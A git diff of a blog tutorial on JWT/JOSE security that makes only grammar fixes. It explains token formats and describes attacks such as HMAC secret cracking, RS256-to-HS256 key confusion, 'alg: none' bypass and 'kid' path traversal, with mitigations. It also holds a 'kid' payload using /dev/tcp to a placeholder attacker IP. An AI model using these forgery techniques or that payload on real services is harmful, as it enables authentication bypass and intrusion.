@@ -8,9 +8,9 @@ categories: []
 ---
 ### What is JOSE?
 
-[`JOSE`](https://datatracker.ietf.org/doc/html/rfc7165) (JavaScript Object Signing & Encryption)  is collection of specifications that consist of  following components :
+[`JOSE`](https://datatracker.ietf.org/doc/html/rfc7165) (JavaScript Object Signing & Encryption)  is a collection of specifications that consist of  the following components :
 
-* [`JWT`](https://datatracker.ietf.org/doc/html/rfc7519)  - JSON Wev Token standard - is [JSON](https://www.json.org/json-en.html) hash ( base64url encoding ) with `claims`, that is signed by `JWS` or encrypted by  `JWE`, and serialized.
+* [`JWT`](https://datatracker.ietf.org/doc/html/rfc7519)  - JSON Web Token standard - is [JSON](https://www.json.org/json-en.html) hash ( base64url encoding ) with `claims`, that is signed by `JWS` or encrypted by  `JWE`, and serialized.
 
 * [`JWS`](https://datatracker.ietf.org/doc/html/rfc7515) JSON Web Signature -  defines how to handle signed claims 
 
@@ -18,18 +18,18 @@ categories: []
 
 ### Why and where it is used?
 
-Once the user is logged in, each subsequent request will include the JWT, with small overhead allowing the user to access routes, services, and resources that are permitted with that token. ( Like a ID badge + fob keys)
+Once the user is logged in, each subsequent request will include the JWT, with a small overhead allowing the user to access routes, services, and resources that are permitted with that token. ( Like a ID badge + fob keys)
 
 Here are some scenarios where JSON Web Tokens are useful:
 - developers usually use JWT to avoid server-side storage for sessions 
 - authentication,  access control mechanisms
 
-For example : SSO ( Single Sign-ON) 
+For example: SSO ( Single Sign-on) 
 
 ___
-### How ?
+### How?
 
-First. I want  to start with straighten things up between JWT, JWS, JWE. What is what? Where JWT ends and JWS begins? Is it all the same ? 
+First. I want  to start with straightening things up between JWT, JWS, and JWE. What is what? Where does JWT end and JWS begin? Is it all the same? 
 
 ----
 #### JWT vs JWS
@@ -37,7 +37,7 @@ First. I want  to start with straighten things up between JWT, JWS, JWE. What is
 
 ##### JWT  
 
-Due to compact serialization `JWT` has two parts:  a `header`, a `payload`
+Due to compact serialization `JWT` has two parts:  a `header`, and a `payload`
 
 ```bash 
 JWT = Base64Url(header) + '.' + Base64Url(payload)
@@ -45,7 +45,7 @@ JWT = Base64Url(header) + '.' + Base64Url(payload)
 ```
 
 
-All JWTs consist of is a header and payload, which are JSON objects.  It is not signed and not encrypted.
+All JWTs consist of a header and payload, which are JSON objects.  It is not signed and not encrypted.
 
 ---
 ##### JWS  
@@ -70,10 +70,9 @@ JWS = Base64Url(header) + '.' + Base64Url(payload) + '.' + Base64Url(signature)
 ```
 
 
-These objects are also Base64-encoded. The encoded header and payload are combined with a digital signature
-, and all three components are concatenated with period. So when someone talking about `JWT` they probably meaning `JWS`.
+These objects are also Base64-encoded. The encoded header and payload are combined with a digital signature, and all three components are concatenated with the period. So when someone talks about `JWT` they probably mean `JWS`.
 
-You can spot `JWT aka JWS` in a bearer token header. It will look something like that :
+You can spot `JWT aka JWS` in a bearer token header. It will look something like this:
 
 ```python
 Authorization: Bearer 
@@ -148,7 +147,7 @@ signature = HMAC-SHA256(key, JWT)
 ---
 ### But what about JWE ?
 
-JWE does not provide the same guarantees as JWS and, therefore, does not replace the role of JWS in a token exchange. JWS and JWE are complementary when public/private key schemes are being used. (this scheme is known as public-key encryption (PKI), were the public key is the encryption key and the private key is the decryption key).
+JWE does not provide the same guarantees as JWS and, therefore, does not replace the role of JWS in a token exchange. JWS and JWE are complementary when public/private key schemes are being used. (this scheme is known as public-key encryption (PKI), where the public key is the encryption key and the private key is the decryption key).
 
 |     | private key | public key |
 | --- | ----------- | ---------- |
@@ -288,7 +287,7 @@ print(jwt.decode(token, 'secret_key', algorithms='HS256'))
 
 #### Attack
 
-If an attacker can crack/brute-force the HMAC secret ( and he can do it easily offline, with enough computational power ) then he would be able to generate a valid signature for any arbitrary token, compromising the entire mechanism allowing to forge anything you like in the token .
+If an attacker can crack/brute-force the HMAC secret ( and he can do it easily offline, with enough computational power ) then he would be able to generate a valid signature for any arbitrary token, compromising the entire mechanism allowing to forge anything you like in the token.
 
 to name a few:
 - [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)
@@ -320,7 +319,7 @@ Adi Shamir and Leonard Adleman, whose initials were used to name the algorithm.
 > 
 > public key  - used for `verifing` ( decryption )
 
-Asymmetric keys should provides better security but still it have some weakness if you are not careful with configurations as well as storage and transmission of your keys. Any tampering with the public key could have security implications. 
+Asymmetric keys should provide better security but still, they have some weaknesses if you are not careful with configurations as well as storage and transmission of your keys. Any tampering with the public key could have security implications. 
 
 #### Example
 
@@ -429,13 +428,13 @@ print(jwt.decode(jwt=token, key=public_key, algorithms=['RS256', ]))
 ---
 #### Attack
 
- If the server is expecting RSA : private key signs - public key verifies, but is sent HMAC-SHA with RSA’s public key, the server will think the `public key`is actually an `HMAC secret key`! 
+ If the server is expecting RSA: private key signs - public key verifies, but is sent HMAC-SHA with RSA’s public key, the server will think the `public key`is actually an `HMAC secret key`! 
  
-#### the scenario of such attack could go like that :
+#### the scenario of such an attack could go like this:
  
-* [1] your RSA public key of the token is been obtained/exposed some how( sometimes it's transmitted with `JWT` itself , or check out more ways to [find_public-keys](https://github.com/ticarpi/jwt_tool/wiki/Finding-Public-Keys))
+* [1] your RSA public key of the token is been obtained/exposed somehow ( sometimes it's transmitted with `JWT` itself, or check out more ways to [find_public-keys](https://github.com/ticarpi/jwt_tool/wiki/Finding-Public-Keys))
 
-* [2] confirmed that format of the public key is right ( you can expect it to be in [PEM format](https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail))
+* [2] confirmed that the format of the public key is right ( you can expect it to be in [PEM format](https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail))
  
 **`PEM` format** is a way of encoding binary/DER data in a way that is more convenient. It derives from a 1990s attempt at secure email named `Privacy-Enhanced Mail` hence the name.
  
@@ -466,9 +465,9 @@ Base64-encodedLastline
 ```
 
 
-* [4] obtained public RSA key used as symmetric key for HMAC.
+* [4] obtained a public RSA key used as a symmetric key for HMAC.
 
-* [5] tampered token send to the server .
+* [5] tampered token sent to the server.
 
 
 ---
@@ -490,7 +489,7 @@ generate_hmac_token = True  # change to False for RSA token for example
 JWTs can be signed using a range of different algorithms, but can also be left unsecured. In this case, the JWT `alg` parameter is set to `none`, meaning the backend will not perform signature verification.
 
 Due to the obvious dangers of this, secure servers usually reject tokens with no signature. 
-But attacker might still has a chance to bypass weak filters ( string parsing ) , using classic obfuscation techniques, such as mixed capitalization or unexpected encoding. (`NonE`, `nONE`... )
+However, the attacker might still have a chance to bypass weak filters ( string parsing ), using classic obfuscation techniques, such as mixed capitalization or unexpected encoding. (`NonE`, `nONE`... )
 
 #### Example
 
@@ -514,7 +513,7 @@ But attacker might still has a chance to bypass weak filters ( string parsing ) 
 	 "admin" = True
 }
 
-[4] By switch the algorithm to 'none' you ditch the signature and can gain the bypasss.
+[4] By switching the algorithm to 'none' you ditch the signature and can gain the bypass.
 
 ```
 ---
@@ -538,7 +537,7 @@ print(newtoken.decode())
 
 | Mitigation |
 | ---------- |
-|    [ Use up to date libraries :)](https://security.snyk.io/vuln/SNYK-PYTHON-PYJWT-40733)
+|    [ Use up-to-date libraries :)](https://security.snyk.io/vuln/SNYK-PYTHON-PYJWT-40733)
 
 
 
@@ -680,7 +679,7 @@ Depending on the format of the key, this may have a matching `kid` parameter
 
 #### Example
 
-*some might use the `kid` parameter to point to a particular entry in a database, or even the name of a file. 
+*some might use the `kid` parameter to point to a particular entry in a database or even the name of a file. 
 
 ```bash
 # For example if 
@@ -693,13 +692,13 @@ http://*/key/12345.pem
  
 * If this parameter is also vulnerable to [directory traversal](https://portswigger.net/web-security/file-path-traversal), an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.
 
-	* This is especially dangerous if the server also supports JWTs signed using symmetrical algorithms. In this case, an attacker could potentially point the `kid` parameter to a predictable, static file, then sign the JWT using a secret that matches the contents of this file.
+	* This is especially dangerous if the server also supports JWTs signed using symmetrical algorithms. In this case, an attacker could potentially point the `kid` parameter to a predictable, static file, and then sign the JWT using a secret that matches the contents of this file.
 
 ```
 "kid":"/dev/tcp/_yourIP_/_yourPort_
 ```
 
-* You could theoretically do this with any file, but one of the simplest methods is to use `/dev/null`, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with a empty string will result in a valid signature
+* You could theoretically do this with any file, but one of the simplest methods is to use `/dev/null`, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with an empty string will result in a valid signature
 
  | Mitigation                                                                               |
  | ---------------------------------------------------------------------------------------- |
@@ -745,7 +744,7 @@ except jwt.InvalidTokenError:
 ---
 ### Denial-of-service attacks
  
- Like any denial-of-service attack the goal is to overwhelm the services to bring them down.
+ Like any denial-of-service attack, the goal is to overwhelm the services to bring them down.
 
  An attacker could supply content using keys that would result in excessive cryptographic processing, for example, keys larger than those mandated in this specification.
 
@@ -780,12 +779,12 @@ ____
 
 
 - Use an` up-to-date library `
-- Do not store sensitive data in payload
+- Do not store sensitive data in the payload
 - Use asymmetric keys if the tokens are used across more than one server
 - Use strong keys/secrets
-- Make sure that you perform robust `signature verification on any JWTs that you receive` , and account for edge-cases such as `JWT` signed using unexpected algorithms.
+- Make sure that you perform robust `signature verification on any JWTs that you receive`, and account for edge-cases such as `JWT` signed using unexpected algorithms.
 - Make sure that you're not vulnerable to [path traversal](https://portswigger.net/web-security/file-path-traversal) or SQL injection via the `kid` header parameter.
-- Always set an` expiration date` for any tokens that you issue.
+- Always set an `expiration date` for any tokens that you issue.
 - `Avoid sending tokens in URL` parameters where possible.
 - Include the `aud` (audience) claim (or similar) to `specify the intended recipient `of the token. This prevents it from being used on different websites.
 - Enable the issuing server to revoke tokens (on logout, for example).
